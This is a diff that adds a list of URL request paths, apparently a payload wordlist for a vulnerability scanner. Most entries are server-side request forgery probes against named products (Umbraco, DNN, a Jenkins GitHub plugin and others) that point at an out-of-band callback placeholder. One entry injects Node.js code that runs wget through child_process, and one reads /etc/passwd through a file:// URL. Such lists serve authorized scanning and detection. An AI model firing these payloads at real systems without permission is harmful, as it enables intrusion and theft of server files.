@@ -1,0 +1,15 @@
+/Umbraco/feedproxy.aspx?url=http://{{interactsh-url}}
+/DnnImageHandler.ashx?mode=file&url=http://{{interactsh-url}}
+/composer/send_email?to={{rand_text_alpha(4)}}@{{rand_text_alpha(4)}}&url=http://{{interactsh-url}}
+/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword?apiUrl=http://{{interactsh-url}}
+/index.php/System/MailConnect/host/{{interactsh-url}}/port/80/secure/
+/?Express=aaaa&autoEscape=&defaultFilter=e%27);var+require=global.require+%7C%7C+global.process.mainModule.constructor._load;+require(%27child_process%27).exec(%27wget%20http://{{interactsh-url}}%27);//
+/registry/machine?app={{rand_base(5)}}&appType=0&version=0&hostname={{rand_base(5)}}&ip={{interactsh-url}}&port=0
+/v1/avatars/favicon?url=http://{{interactsh-url}}
+/pictureproxy.php?url=file:///etc/passwd
+/pictureproxy.php?url=http://{{interactsh-url}}
+/apply/index.php?url=http://{{interactsh-url}}
+/%5C%5C{{interactsh-url}}/apachehttpd
+/unified-console.html
+/jpeginfo/jpeginfo.php?url={{interactsh-url}}
+/render.html?url=https://oast.live
